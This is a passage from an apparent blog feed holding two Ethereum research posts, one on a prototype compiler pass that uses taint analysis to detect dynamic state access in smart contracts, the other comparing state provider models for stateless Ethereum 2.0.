+&lt;p&gt;Continuing the exploration of state provider models described &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;state-provider-models-in-ethereum-2-0&#x2F;6750&quot;&gt;earlier&lt;&#x2F;a&gt;, we have roughly prototyped a modification to the solidity compiler that can detect instances of DSA in smart contracts using taint analysis.&lt;&#x2F;p&gt;
+&lt;p&gt;This proof of concept shows that it is possible to build tooling to support a purely SSA Ethereum.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;background&quot;&gt;Background&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;state-access-witnesses&quot;&gt;State Access &amp;amp; Witnesses&lt;&#x2F;h3&gt;
+&lt;p&gt;For the direct push state provider model to work, the actor creating the transaction should be able to build a witness (such as a Merkle proof) to every storage location the transaction will read or write. If the transaction &lt;em&gt;does&lt;&#x2F;em&gt; read from or write to a location not included in the witness, the transaction is reverted, and its fees are forfeit.&lt;&#x2F;p&gt;
+&lt;p&gt;DSA is a particularly problematic issue that can lead to an insufficient witness. In concrete terms, DSA occurs when the &lt;code&gt;offset&lt;&#x2F;code&gt; argument to &lt;code&gt;sload&lt;&#x2F;code&gt; or &lt;code&gt;sstore&lt;&#x2F;code&gt; is influenced by a previous &lt;code&gt;sload&lt;&#x2F;code&gt; result.&lt;&#x2F;p&gt;
+&lt;p&gt;A short classification of some types of DSA, with solidity examples, can be found &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;SamWilsn&#x2F;369de587ac7373c8f77ed26079531671&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;yul-language&quot;&gt;Yul Language&lt;&#x2F;h3&gt;
+&lt;p&gt;Example code in this article is written in pseudocode loosely resembling EVM-flavored &lt;a href=&quot;https:&#x2F;&#x2F;solidity.readthedocs.io&#x2F;en&#x2F;v0.6.3&#x2F;yul.html&quot;&gt;Yul&lt;&#x2F;a&gt;, an internal representation language used in the solidity compiler. The prototype is written as an optimization pass that operates on Yul.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;taint-analysis&quot;&gt;Taint Analysis&lt;&#x2F;h3&gt;
+&lt;p&gt;Taint analysis (or &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Taint_checking&quot;&gt;taint checking&lt;&#x2F;a&gt;) is a type of data flow analysis where &amp;quot;taint&amp;quot; flows from an upstream source into all downstream variables. It is commonly used in web applications, where user supplied values (like headers) are the source of taint, and variables used in database queries are verified to be taint-free.&lt;&#x2F;p&gt;
+&lt;p&gt;In a compiled language, it is conceptually similar to symbolic execution, though much less complex.&lt;&#x2F;p&gt;
+&lt;p&gt;Consider the following example, where &lt;code&gt;value&lt;&#x2F;code&gt; is tainted by an &lt;code&gt;sload&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function tweedle() -&amp;gt; twixt
+{
+    let zero := 0
+    let value := sload(zero)
+    let dee := 45
+    let dum := add(dee, value)
+    let rattle := 88
+
+    let selector := gt(dum, 100)
+
+    switch selector
+    case 0 {
+        twixt := dee
+    }
+    default {
+        twixt := rattle
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The graph below shows the flow of taint from &lt;code&gt;value&lt;&#x2F;code&gt; all the way to &lt;code&gt;twixt&lt;&#x2F;code&gt;. Red nodes and edges indicate taint, and dotted lines represent indirect influence (in this case, through the &lt;code&gt;switch&lt;&#x2F;code&gt;.)&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;00-tweedle.png&quot; alt=&quot;tweedle&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;prototype&quot;&gt;Prototype&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;implementation&quot;&gt;Implementation&lt;&#x2F;h3&gt;
+&lt;p&gt;Implementation source code is available for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SamWilsn&#x2F;solidity&#x2F;blob&#x2F;state-taint-0.5.16&#x2F;libyul&#x2F;optimiser&#x2F;OrderDependentStateDestroyer.cpp&quot;&gt;solidity 0.5&lt;&#x2F;a&gt; and for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SamWilsn&#x2F;solidity&#x2F;blob&#x2F;state-taint&#x2F;libyul&#x2F;optimiser&#x2F;OrderDependentStateDestroyer.cpp&quot;&gt;solidity 0.6&lt;&#x2F;a&gt;, though not all features are implemented on both branches. Test cases can be found &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SamWilsn&#x2F;taint-tests&quot;&gt;here&lt;&#x2F;a&gt;, though not all successfully pass. This prototype is built as a Yul optimization pass, and so requires &lt;code&gt;--optimize-yul --ir&lt;&#x2F;code&gt; as additional compiler flags.&lt;&#x2F;p&gt;
+&lt;p&gt;Since this is a proof of concept, the output is messy and barely readable, the implementation is inefficient, and is 100% capable of summoning &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Undefined_behavior&quot;&gt;nasal demons&lt;&#x2F;a&gt;. Obviously, don&#x27;t use this software in any kind of production environment.&lt;&#x2F;p&gt;
+&lt;p&gt;The analysis can be split into three conceptual phases: data gathering, function resolution, and taint checking.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;data-gathering&quot;&gt;Data Gathering&lt;&#x2F;h4&gt;
+&lt;p&gt;In the data gathering phase, the analyzer visits each node in the Yul abstract syntax tree (AST). This phase accomplishes several goals:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Creates a scope for each function;&lt;&#x2F;li&gt;
+&lt;li&gt;Tracks variable assignments, declarations, and function calls;&lt;&#x2F;li&gt;
+&lt;li&gt;Tracks return variables and arguments of &lt;code&gt;sload&lt;&#x2F;code&gt; and &lt;code&gt;sstore&lt;&#x2F;code&gt;;&lt;&#x2F;li&gt;
+&lt;li&gt;Resolves the effects of built-in functions (ex. &lt;code&gt;add&lt;&#x2F;code&gt;, &lt;code&gt;iszero&lt;&#x2F;code&gt;);&lt;&#x2F;li&gt;
+&lt;li&gt;Propagates constant values; and&lt;&#x2F;li&gt;
+&lt;li&gt;Converts memory accesses into special variables.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The following is a simplified example of the information collected for the given input:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{
+    let zero := 0
+    let ret_0 := fun_narf_19()
+    sstore(ret_0, zero)
+
+    function fun_narf_19() -&amp;gt; vloc__4
+    {
+        let addr := 97
+        let foo_0 := 54
+        let foo_1 := sload(addr)
+
+        vloc__4 := add(foo_0, foo_1)
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The collected output:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;Known Variables:
+    addr         [constant=97] [Untaintable]
+    ret_0                      [Untaintable]
+    zero         [constant=0]
+    vloc__4
+    foo_0        [constant=54]
+    foo_1                      [Tainted]
+    !!block_0    [constant]
+
+Functions:
+	!!main() -&amp;gt;
+		Data Flow:
+			!!block_0            -&amp;gt; zero, ret_0,
+		Unresolved Function Calls:
+			- fun_narf_19
+
+	fun_narf_19() -&amp;gt; vloc__4,
+		Data Flow:
+			addr                 -&amp;gt; foo_1,
+			foo_1                -&amp;gt; vloc__4,
+			foo_0                -&amp;gt; vloc__4,
+			!!block_0            -&amp;gt; addr, foo_1, foo_0, vloc__4,
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;01-split.png&quot; alt=&quot;split&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The variable &lt;code&gt;!!block_0&lt;&#x2F;code&gt; is synthesized to represent indirect influence, such as &lt;code&gt;if&lt;&#x2F;code&gt; statements and loops. This example does not contain any indirect influence, though the block variables are still created. The &lt;code&gt;!!main&lt;&#x2F;code&gt; function represents statements not contained in any other function, like the &lt;code&gt;sstore&lt;&#x2F;code&gt; in the example code.&lt;&#x2F;p&gt;
+&lt;p&gt;Data flow, in the example output, shows how data flows from upstream variables (to the left of &lt;code&gt;-&amp;gt;&lt;&#x2F;code&gt;) to downstream variables (on the right.)&lt;&#x2F;p&gt;
+&lt;p&gt;Note that &lt;code&gt;fun_narf_19&lt;&#x2F;code&gt; is listed as an unresolved function call.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;a-note-on-memory&quot;&gt;A Note on Memory&lt;&#x2F;h5&gt;
+&lt;p&gt;Memory accesses are tracked by synthesizing variables (ex. &lt;code&gt;!!m0&lt;&#x2F;code&gt;) for every &lt;code&gt;mstore&lt;&#x2F;code&gt;, similar to how compilers convert to &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Static_single_assignment_form&quot;&gt;single static assignment&lt;&#x2F;a&gt; form. This process relies on very basic &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Constant_folding#Constant_folding&quot;&gt;constant folding&lt;&#x2F;a&gt;. Should an &lt;code&gt;mstore&lt;&#x2F;code&gt; or an &lt;code&gt;mload&lt;&#x2F;code&gt; access an offset which is not computable at compile time or has not been written to yet, a catch-all variable &lt;code&gt;!!memory&lt;&#x2F;code&gt; is used instead.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;function-resolution&quot;&gt;Function Resolution&lt;&#x2F;h4&gt;
+&lt;p&gt;The function resolution phase iteratively embeds callee function scopes into the caller&#x27;s scope, uniquely renaming variables in the data flow graph. Embedding functions in this way allows accurate tracing between arguments and return variables.&lt;&#x2F;p&gt;
+&lt;p&gt;Continuing with the above example, the data flow graph after this phase looks like:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;Functions:
+	!!main() -&amp;gt;
+		Data Flow:
+			!!block_0            -&amp;gt; zero, ret_0, addr_embed0, foo_1_embed1, foo_0_embed3, vloc__4_embed2
+			addr_embed0          -&amp;gt; foo_1_embed1,
+			foo_1_embed1         -&amp;gt; vloc__4_embed2,
+			foo_0_embed3         -&amp;gt; vloc__4_embed2,
+			vloc__4_embed2       -&amp;gt; ret_0
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;02-resolved.png&quot; alt=&quot;resolved&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;taint-checking&quot;&gt;Taint Checking&lt;&#x2F;h4&gt;
+&lt;p&gt;Last, and probably simplest, is taint checking. This phase walks through the data flow graph, tainting every variable that is reachable from an initially tainted variable.&lt;&#x2F;p&gt;
+&lt;p&gt;Once the taint is propagated, the &amp;quot;protected&amp;quot; variables (variables used as the key argument to an &lt;code&gt;sload&lt;&#x2F;code&gt; or &lt;code&gt;sstore&lt;&#x2F;code&gt;) are checked for taint. If tainted protected variables are found, a taint violation exception is thrown.&lt;&#x2F;p&gt;
+&lt;p&gt;In this example, &lt;code&gt;ret_0&lt;&#x2F;code&gt; is both protected and tainted.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;03-taint.png&quot; alt=&quot;tainted&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;limitations-future-work&quot;&gt;Limitations &amp;amp; Future Work&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;call-graph-cycles&quot;&gt;Call Graph Cycles&lt;&#x2F;h4&gt;
+&lt;p&gt;A call graph cycle happens when a function &lt;code&gt;foo&lt;&#x2F;code&gt; calls a function &lt;code&gt;bar&lt;&#x2F;code&gt; and &lt;code&gt;bar&lt;&#x2F;code&gt; also calls &lt;code&gt;foo&lt;&#x2F;code&gt;. For example:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function foo(arg0) -&amp;gt; ret0 {
+    switch arg0
+    case 0 {
+        ret0 := bar()
+    }
+    default {
+        ret0 := 1
+    }
+}
+
+function bar() -&amp;gt; ret1 {
+    ret1 := foo(1)
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Cycles in the call graph currently cause the prototype to loop infinitely. It should be possible to break these cycles by assuming all parameters of one function influence all of that function&#x27;s return variables.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;constant-propagation&quot;&gt;Constant Propagation&lt;&#x2F;h4&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Constant_folding#Constant_folding&quot;&gt;Constant propagation&lt;&#x2F;a&gt; is the process of substituting the values of known constants in expressions at compile time.&lt;&#x2F;p&gt;
+&lt;p&gt;This prototype implements a very limited form of constant propagation to support the &lt;code&gt;mstore&lt;&#x2F;code&gt; and &lt;code&gt;mload&lt;&#x2F;code&gt; instructions. If the offset argument to &lt;code&gt;mstore&lt;&#x2F;code&gt; or &lt;code&gt;mload&lt;&#x2F;code&gt; can be computed at compile time, the taint analysis through memory is more accurate (fewer misleading taint violations.)&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;calling-contracts&quot;&gt;Calling Contracts&lt;&#x2F;h4&gt;
+&lt;p&gt;The builtin functions to call other contracts are disabled in the prototype. Enabling them requires further thought on the ABI between contracts.&lt;&#x2F;p&gt;
+&lt;p&gt;Currently the prototype assumes that call data opcodes (&lt;code&gt;CALLDATALOAD&lt;&#x2F;code&gt;, &lt;code&gt;CALLDATASIZE&lt;&#x2F;code&gt;, &lt;code&gt;CALLDATACOPY&lt;&#x2F;code&gt;, etc) return untainted data. If a contract calls another contract, that assumption is invalidated.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;control-flow&quot;&gt;Control Flow&lt;&#x2F;h4&gt;
+&lt;p&gt;The approach taken in this prototype to handle control flow and branching (synthesizing &lt;code&gt;!!block&lt;&#x2F;code&gt; variables) is insufficient to accurately trace taint through loops.&lt;&#x2F;p&gt;
+&lt;p&gt;Consider the following:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function fizzbuzz() {
+    for { } 1 { }
+    {
+        let zero := 0
+        let foo := sload(zero)
+        let cond := eq(foo, zero)
+        if cond {
+            break
+        }
+    }
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Which roughly translates to the following data flow graph:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;04-flow.png&quot; alt=&quot;control flow&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;zero&lt;&#x2F;code&gt; is not influenced by &lt;code&gt;!!block_0&lt;&#x2F;code&gt; between where it is assigned and where it is used for &lt;code&gt;sload&lt;&#x2F;code&gt;. In other words, &lt;code&gt;zero&lt;&#x2F;code&gt; is not dependent on &lt;code&gt;storage[0]&lt;&#x2F;code&gt; at the time &lt;code&gt;sload&lt;&#x2F;code&gt; is called, even though the data flow graph thinks it is.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;bit-accurate-taint&quot;&gt;Bit-Accurate Taint&lt;&#x2F;h4&gt;
+&lt;p&gt;Variables in the prototype are tracked as an indivisible unit, which may be tainted or clean. Tracking each bit of a variable separately enables more accurate analysis.&lt;&#x2F;p&gt;
+&lt;p&gt;This improvement is particularly relevant when using boolean operations (like &lt;code&gt;or&lt;&#x2F;code&gt; &amp;amp; &lt;code&gt;and&lt;&#x2F;code&gt;) and the &lt;code&gt;mload&lt;&#x2F;code&gt; instruction with non-256 bit types.&lt;&#x2F;p&gt;
+&lt;p&gt;For example, the following snippet does not exhibit any DSA, though the prototype will report a taint violation:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;function fizzbuzz(value)
+{
+    &#x2F;&#x2F; Place a constant byte into memory.
+    mstore(0, 0xAB)
+
+    &#x2F;&#x2F; Read a value from storage, place it into memory. This
+    &#x2F;&#x2F; taints memory offsets 1 through 32 inclusive.
+    let from_storage := sload(0)
+    mstore(1, from_storage)
+
+    &#x2F;&#x2F; Get the constant back from memory.
+    let mem_tainted := mload(0)
+    let mem_cleaned := and(mem_tainted, 0xFF)
+
+    sstore(mem_cleaned, 0xC0FFEE)
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After execution, the first 33 bytes of memory look like:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;05-bytes.png&quot; alt=&quot;bytes&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Since &lt;code&gt;mload(0)&lt;&#x2F;code&gt; populates &lt;code&gt;mem_tainted&lt;&#x2F;code&gt; with the first 32 bytes of memory, &lt;code&gt;mem_tainted&lt;&#x2F;code&gt; contains 31 tainted bytes (all bytes after &lt;code&gt;memory[0]&lt;&#x2F;code&gt;). &lt;code&gt;mem_cleaned&lt;&#x2F;code&gt;, on the other hand, contains no tainted bytes, since only the first byte can influence its value; the other bits are masked out by &lt;code&gt;and&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;unimplemented-features-in-yul&quot;&gt;Unimplemented Features in Yul&lt;&#x2F;h4&gt;
+&lt;p&gt;The solidity compiler&#x27;s Yul implementation doesn&#x27;t yet support libraries. This makes analyzing existing contracts tedious at best.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;conclusions&quot;&gt;Conclusions&lt;&#x2F;h2&gt;
+&lt;p&gt;Although the limitations mentioned above present challenges for analyzing existing contracts for DSA, we believe that existing compilers &lt;strong&gt;can&lt;&#x2F;strong&gt; be extended, with reasonable effort, to detect and prevent DSA while maintaining features. Furthermore, given the ease of inadvertently introducing DSA, we believe that adding this feature to smart contract compilers is &lt;strong&gt;necessary&lt;&#x2F;strong&gt; to write secure code.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;PhABC&#x2F;uniswap-solidity&#x2F;blob&#x2F;2434367a66b6091db7b808ed91e7ade61fad6f7d&#x2F;contracts&#x2F;tokens&#x2F;ERC20.sol&quot;&gt;One contract&lt;&#x2F;a&gt;, part of &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;u&#x2F;phabc&#x2F;summary&quot;&gt;@PhABC&lt;&#x2F;a&gt;&#x27;s uniswap-solidity, did successfully compile with minimal modification.&lt;&#x2F;p&gt;
+&lt;p&gt;A big thanks to Quilt for supporting this research and providing invaluable review and feedback.&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>State Provider Models in Ethereum 2.0</title>
+                <pubDate>Thu, 09 Jan 2020 17:58:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/ethereum-state/</link>
+                <guid>https://binarycake.ca/posts/ethereum-state/</guid>
+                <description>&lt;p&gt;&lt;em&gt;This post was co-authored by &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;u&#x2F;adietrichs&#x2F;summary&quot;&gt;@adietrichs&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;u&#x2F;samwilsn&#x2F;summary&quot;&gt;@samwilsn&lt;&#x2F;a&gt;, with significant input by &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;u&#x2F;villanuevawill&#x2F;summary&quot;&gt;@villanuevawill&lt;&#x2F;a&gt; and the Quilt team. Originally posted on &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;state-provider-models-in-ethereum-2-0&#x2F;6750&quot;&gt;ethresear.ch&lt;&#x2F;a&gt;.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
+&lt;p&gt;Ethereum 2.0&#x27;s statelessness means that transactions have to bring their own state. More precisely, for every transaction a &lt;strong&gt;block proposer (BP)&lt;&#x2F;strong&gt; wants to include into a block, they also have to include all state accessed by that transaction, as well as the corresponding witnesses. Neither the &lt;strong&gt;user&lt;&#x2F;strong&gt; creating the transaction nor the BP are assumed to hold state. Thus, a new kind of actor is required, whose role it is to hold and provide such state. This actor is commonly known as a &lt;strong&gt;state provider (SP)&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Regardless of how BPs and SPs exchange state, it is likely going to be necessary for users to fetch state before creating a transaction. Examples include fetching contract bytecode to estimate gas cost or checking an account balance. This means SPs will expose a pull-like interface for users. An optional incentive layer could be added with payments for state via payment channels, although it seems feasible to start without such a system and rely on SPs altruistically providing state to users (as is currently the case in Ethereum 1.0).&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;comparison-criteria&quot;&gt;Comparison Criteria&lt;&#x2F;h3&gt;
+&lt;p&gt;There are several different ways to integrate SPs into the overall system. In the following sections, we give an overview over several proposals. Besides a general description of each model, we compare the following properties:&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;state-access-restrictions&quot;&gt;State Access Restrictions&lt;&#x2F;h4&gt;
+&lt;p&gt;As transactions operate on the current state at the time of execution, their behaviour &lt;!-- SW: I appreciate the Canadian spelling ;) --&gt; changes as the underlying state changes. In particular, for some transaction, the locations of state access might vary. This could either happen as a result of simple branching (e.g. &lt;code&gt;if&lt;&#x2F;code&gt;) or if the location is calculated at runtime. We refer to either case as a &lt;strong&gt;dynamic state access (DSA)&lt;&#x2F;strong&gt;. In a stateless model, this complicates the transaction creation process. The problem is that it might not be possible to provide state for some of those transactions in advance (i.e. before the exact global state is known against which the tx will be executed). The models presented differ in the extent to which they support those transactions.&lt;&#x2F;p&gt;
+&lt;p&gt;Under a model restricting dynamic state access, it seems very likely that &lt;strong&gt;Eth1 &lt;em&gt;cannot&lt;&#x2F;em&gt; become an Eth2 execution environment (EE)&lt;&#x2F;strong&gt; and will always require special treatment.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;incentives&quot;&gt;Incentives&lt;&#x2F;h4&gt;
+&lt;p&gt;The rewards for SPs are compared on:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Who pays the reward, and how is it calculated?&lt;&#x2F;li&gt;
+&lt;li&gt;Are altruistic SPs viable initially, and if so, can incentives be added later?&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;centralization-risks&quot;&gt;Centralization Risks&lt;&#x2F;h4&gt;
+&lt;p&gt;Each model presents different levels of risk related to centralization:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Who can censor transactions, and to what extent?&lt;&#x2F;li&gt;
+&lt;li&gt;How much state is a single SP expected to store? What hardware will be required?&lt;&#x2F;li&gt;
+&lt;li&gt;How much do BPs and SPs have to trust each other?&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h4 id=&quot;timing-constraints&quot;&gt;Timing Constraints&lt;&#x2F;h4&gt;
+&lt;p&gt;BPs have a fixed amount of time to propose a block. In this section, we will highlight operations in each model that might be constrained by this time limit.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;attributability-of-missing-state&quot;&gt;Attributability of Missing State&lt;&#x2F;h4&gt;
+&lt;p&gt;In Eth1, miners can be certain that they will be paid as soon as the initial signature verification and balance and nonce checks for a given transaction are complete. In Eth2, this depends on whether missing state is an attributable fault. If it is, the BP can still be paid for a transaction failing due to missing state. Otherwise, transactions missing state will be non-includable, which BPs might only notice after running the full (potentially lengthy) transaction.&lt;&#x2F;p&gt;
+&lt;p&gt;If BPs run transactions that fail due to missing state, and those transactions are non-includable (i.e. unable to pay fees), BPs are vulnerable to a nearly zero cost denial of service attack.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;models&quot;&gt;Models&lt;&#x2F;h2&gt;
+&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;center&quot;&gt;Model&lt;&#x2F;th&gt;&lt;th align=&quot;center&quot;&gt;State Access&lt;&#x2F;th&gt;&lt;th align=&quot;center&quot;&gt;Incentives&lt;&#x2F;th&gt;&lt;th align=&quot;center&quot;&gt;Centralization Risks&lt;&#x2F;th&gt;&lt;th align=&quot;center&quot;&gt;Timing Constraints&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
+&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;ethereum-state&#x2F;#direct-push-model&quot;&gt;Direct Push&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Restricted&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Altruism &lt;em&gt;or&lt;&#x2F;em&gt; Payment Channels&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Well-known SP are preferred&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;None&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;ethereum-state&#x2F;#relayed-push-model&quot;&gt;Relayed Push&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Unrestricted&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Bundle Market &lt;em&gt;or&lt;&#x2F;em&gt; Exclusivity Period&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Censorship potential&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Update &amp;amp; transfer bundle within one slot&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;ethereum-state&#x2F;#pull-model&quot;&gt;Pull&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Unrestricted&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Payment Channels&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Well-known SP are preferred&lt;&#x2F;td&gt;&lt;td align=&quot;center&quot;&gt;Acquire bundle state within one slot&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
+&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
+&lt;h3 id=&quot;direct-push-model&quot;&gt;Direct Push Model&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;direct-push.png&quot; alt=&quot;Two users pushing state directly to BP&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;A user acquires the necessary state directly from one or more SPs, then sends the transaction with that state attached to the network. Nodes maintain a pool of pending transactions, refreshing witnesses as blocks are produced. When creating a block, a BP chooses a subset of the pending transactions from the pool to include into the new block.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;state-access-restrictions-1&quot;&gt;State Access Restrictions&lt;&#x2F;h4&gt;
+&lt;p&gt;The user creating a transaction is the only actor in the system providing state for that transaction. In general, there is no way to ensure that this state is sufficient for any state access occurring later on when the transaction is included into a block. Thus, under the Direct Push Model, only transactions where state access is predictable are possible. Besides transactions with purely static state access, contract creators could design their contracts to have predictable state access using annotations such as access lists, where the contract specifies all locations it can possibly access during execution. Together with ways to avoid dynamic state access patterns (see e.g. &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;common-classes-of-contracts-and-how-they-would-handle-contract-state-root-plus-witness-architecture&#x2F;4547&quot;&gt;this related post&lt;&#x2F;a&gt; by Vitalik in the Eth 1.x context), the resulting model might still offer sufficient functionality. &lt;&#x2F;p&gt;
+&lt;p&gt;However, this would be a clear departure from the current Eth1 system, and would, in particular, make any plans to transition Eth1 into an Eth2 EE impossible.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;incentives-1&quot;&gt;Incentives&lt;&#x2F;h4&gt;
+&lt;p&gt;This model would just rely on the general SP network. As discussed above, it seems feasible to start without an incentive system.&lt;&#x2F;p&gt;
+&lt;p&gt;Incentivization could be added via payment channels. Given that every user would have to have an open payment channel with one or several state providers, this option would be rather complex.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;centralization-risks-1&quot;&gt;Centralization Risks&lt;&#x2F;h4&gt;
+&lt;p&gt;No individual SP can censor a transaction, since users are able to issue multiple queries to different SPs.&lt;&#x2F;p&gt;
+&lt;p&gt;SPs can hold any subset of state, so the hardware requirements are minimal.&lt;&#x2F;p&gt;
+&lt;p&gt;Monetary incentives would likely encourage some SP centralization, since users would need to trust SPs when purchasing state through a payment channel.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;timing-constraints-1&quot;&gt;Timing Constraints&lt;&#x2F;h4&gt;
+&lt;p&gt;No timing constraints.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;attributability-of-missing-state-1&quot;&gt;Attributability of Missing State&lt;&#x2F;h4&gt;
